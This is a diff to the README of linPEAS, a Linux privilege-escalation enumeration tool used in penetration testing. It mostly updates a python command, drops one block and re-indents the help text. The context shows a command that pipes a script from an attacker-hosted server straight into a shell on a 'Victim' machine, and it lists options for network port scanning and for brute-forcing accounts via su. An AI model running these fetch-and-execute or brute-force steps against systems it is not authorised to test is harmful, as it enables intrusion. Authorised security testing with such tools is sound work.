@@ -22,7 +22,7 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 
 ```bash
 # Local network
-sudo python -m http.server 80 #Host
+sudo python3 -m http.server 80 #Host
 curl 10.10.10.10/linpeas.sh | sh #Victim
 
 # Without curl
@@ -45,12 +45,6 @@ less -r /dev/shm/linpeas.txt #Read with colors
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
 chmod +x linpeas_linux_amd64
 ./linpeas_linux_amd64
-```
-
-```bash
-# Execute from memory in Penelope session
-# From: https://github.com/brightio/penelope
-> run peass-ng
 ```
 
 ## Firmware Analysis
@@ -107,7 +101,7 @@ By default linpeas takes around **4 mins** to complete, but It could take from *
 - **-D** (Debug) - Print information about the checks that haven't discovered anything and about the time each check took
 - **-d/-p/-i/-t** (Local Network Enumeration) - Linpeas can also discover and port-scan local networks
 
-This script has **several lists** included inside of it to be able to **color the results** in order to highlight PE vector.
+**It's recommended to use the params `-a` and `-r` if you are looking for a complete and intensive scan**.
 
 ```
 Enumerate and search Privilege Escalation vectors.
@@ -119,11 +113,11 @@ This tool enum and search possible misconfigurations (known vulns, user, process
             -t Automatic network scan & Internet conectivity checks - This option writes to files
             -r Enable Regexes (this can take from some mins to hours)
             -P Indicate a password that will be used to run 'sudo -l' and to bruteforce other users accounts via 'su'
-	    -D Debug mode
+	      -D Debug mode
 
         Network recon:
             -t Automatic network scan & Internet conectivity checks - This option writes to files
-	    -d <IP/NETMASK> Discover hosts using fping or ping. Ex: -d 192.168.0.1/24
+	      -d <IP/NETMASK> Discover hosts using fping or ping. Ex: -d 192.168.0.1/24
             -p <PORT(s)> -d <IP/NETMASK> Discover hosts looking for TCP open ports (via nc). By default ports 22,80,443,445,3389 and another one indicated by you will be scanned (select 22 if you don't want to add more). You can also add a list of ports. Ex: -d 192.168.0.1/24 -p 53,139
             -i <IP> [-p <PORT(s)>] Scan an IP using nc. By default (no -p), top1000 of nmap will be scanned, but you can select a list of ports instead. Ex: -i 127.0.0.1 -p 53,80,443,8000,8080
              Notice that if you specify some network scan (options -d/-p/-i but NOT -t), no PE check will be performed
@@ -136,10 +130,10 @@ This tool enum and search possible misconfigurations (known vulns, user, process
 
         Misc:
             -h To show this message
-	    -w Wait execution between big blocks of checks
+	      -w Wait execution between big blocks of checks
             -L Force linpeas execution
             -M Force macpeas execution
-	    -q Do not show banner
+	      -q Do not show banner
             -N Do not use colours
 
 ```
